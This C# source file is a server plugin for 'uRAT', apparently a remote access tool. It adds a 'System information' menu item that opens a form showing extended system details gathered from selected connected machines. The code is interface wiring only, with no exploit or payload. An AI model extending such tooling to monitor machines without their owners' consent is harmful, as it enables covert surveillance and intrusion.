using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using uNet2.Channel.Events;
using uNet2.Packet;
using uNet2.Packet.Events;
using uRAT.CorePlugin.ExtendedSystemInformation.Forms;
using uRAT.CorePlugin.ExtendedSystemInformation.Operations;
using uRAT.CorePlugin.ExtendedSystemInformation.Packets;
using uRAT.Server.Plugin.Server;
using uRAT.Server.Plugin.UIService;
using uRAT.Server.Plugin.UIService.Services;

namespace uRAT.CorePlugin.ExtendedSystemInformation
{
    class ExtendedSystemInformationPlugin : IServerPlugin
    {
        public string MenuTitle
        {
            get { return null; }
        }

        public List<IPacket> PluginPackets
        {
            get
            {
                return new List<IPacket>
                {
                    new FetchExtendedInformationPacket()
                };
            }
        }

        public void Initialize()
        {
            var connectionList = UiServiceProvider.GetService("ConnectionList") as ConnectionListService;
            var tsItm = new ToolStripMenuItem("System information");
            tsItm.Click += tsItm_Click;
            if (connectionList != null) 
                connectionList.AddContextMenuItem(tsItm);
        }

        void tsItm_Click(object sender, EventArgs e)
        {
            var connectionList = UiServiceProvider.GetService("ConnectionList") as ConnectionListService;
            foreach (var itm in connectionList.GetSelectedItems())
            {
                var op =
                    itm.AssociatedChannel.CreateOperation<ExtendedInformationOperation>(itm.AssociatedPeer.Identity.Guid);
                var extInfoFrm = new ExtendedInformationForm(op);
                extInfoFrm.Show();
            }
        }


        public void OnPeerConnected(ChannelEventArgs e)
        {

        }

        public void OnPeerDisconnected(ChannelEventArgs e)
        {
 
        }

        public void OnPacketReceived(ServerPacketEventArgs e)
        {
         
        }
    }
}
